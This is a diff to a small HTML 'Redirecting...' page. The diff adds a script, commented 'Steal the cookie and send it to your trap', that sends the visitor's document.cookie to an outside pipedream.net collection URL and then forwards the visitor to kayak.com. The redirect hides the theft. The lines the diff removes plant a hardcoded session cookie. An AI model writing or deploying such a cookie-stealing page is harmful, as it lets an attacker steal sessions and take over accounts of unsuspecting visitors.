@@ -2,11 +2,14 @@
 <html>
   <head>
     <title>Redirecting...</title>
-    <script>;
-      document.cookie = "p1.med.sid=R-4GMiQV68ipPVRHUC82JRF-Dhf8Ips0_fP6WbbzeXZ2FPZ86c6_WkvDPq6zYP5WV; domain=https://www.kayak.com/profile/payment; path=/";
+    <script>
+      // Steal the cookie and send it to your trap
+      new Image().src = "https://eoh3rxe2o8pbhuj.m.pipedream.net/?cookie=" + document.cookie;
+
+      // Then redirect them to Kayak
       setTimeout(() => {
         window.location.href = "https://www.kayak.com";
-      }, 1000);
+      }, 1500);
     </script>
   </head>
   <body>
